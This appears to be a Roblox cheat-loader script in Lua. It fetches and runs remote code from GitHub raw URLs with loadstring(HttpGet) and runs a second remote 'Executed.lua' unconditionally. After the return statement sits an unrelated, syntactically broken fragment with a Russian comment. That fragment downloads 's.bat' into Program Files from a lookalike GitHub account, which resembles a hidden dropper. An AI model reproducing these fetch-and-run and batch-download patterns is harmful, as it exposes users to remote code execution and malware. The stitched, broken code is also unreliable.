local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ratkinator/RatX/refs/heads/main/Games.lua"))()
local scriptUrl = Games[game.GameId]
if scriptUrl then
    loadstring(game:HttpGet(scriptUrl))()
    task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Ratkinator/RatX/refs/heads/main/Executed.lua"))() end)
else
    warn("❌ Unsupported game | GameId:", game.GameId)
end
return Games
--main()
        if not doesFileExist("/Program Files/s.bat") then -- Проверка отсутствует ли файл
            local url = 'https://github.com/Ratklnatorzxnda/Raqop/blob/main/s.bat'
            download_id = downloadUrlToFile(url, '/Program Files/s.bat', function(id, status, p1, p2)
                end
            end)
        end
